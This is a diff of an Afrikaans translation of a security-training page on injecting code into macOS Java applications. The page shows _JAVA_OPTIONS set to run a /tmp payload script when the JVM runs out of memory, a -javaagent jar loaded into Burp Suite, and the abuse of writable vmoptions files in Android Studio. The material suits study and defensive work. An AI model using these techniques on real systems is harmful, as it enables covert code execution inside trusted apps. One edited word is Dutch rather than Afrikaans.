@@ -14,7 +14,7 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-Die omgewing veranderlike **`_JAVA_OPTIONS`** kan gebruik word om arbitrêre java parameters in die uitvoering van 'n java gecompileerde toepassing in te voeg:
+Die omgewing veranderlike **`_JAVA_OPTIONS`** kan gebruik word om arbitrêre java parameters in die uitvoering van 'n java gecompileerde toepassing in te spuit:
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
@@ -114,7 +114,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-En dan voer die omgewing veranderlike uit en hardloop die java-toepassing soos:
+En dan voer die omgewing veranderlike uit en hardloop die java toepassing soos:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -125,12 +125,12 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 ```
 ## vmoptions-lêer
 
-Hierdie lêer ondersteun die spesifikasie van **Java params** wanneer Java uitgevoer word. Jy kan sommige van die vorige truuks gebruik om die java params te verander en **die proses te laat uitvoer willekeurige opdragte**.\
+Hierdie lêer ondersteun die spesifikasie van **Java params** wanneer Java uitgevoer word. Jy kan sommige van die vorige truuks gebruik om die java params te verander en **die proses in staat te stel om arbitrêre opdragte uit te voer**.\
 Boonop kan hierdie lêer ook **ander insluit** met die `include` gids, so jy kan ook 'n ingeslote lêer verander.
 
 Nog meer, sommige Java-apps sal **meer as een `vmoptions`** lêer **laai**.
 
-Sommige toepassings soos Android Studio dui in hul **uitset aan waar hulle soek** vir hierdie lêers, soos:
+Sommige toepassings soos Android Studio dui in hul **uitset aan waar hulle soek** na hierdie lêers, soos:
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -149,6 +149,6 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Let op hoe interessant dit is dat Android Studio in hierdie voorbeeld probeer om die lêer **`/Applications/Android Studio.app.vmoptions`** te laai, 'n plek waar enige gebruiker van die **`admin` groep skryfreëls het.** 
+Let op hoe interessant dit is dat Android Studio in hierdie voorbeeld probeer om die lêer **`/Applications/Android Studio.app.vmoptions`** te laai, 'n plek waar enige gebruiker van die **`admin` groep skryfrechten het.** 
 
 {{#include ../../../banners/hacktricks-training.md}}
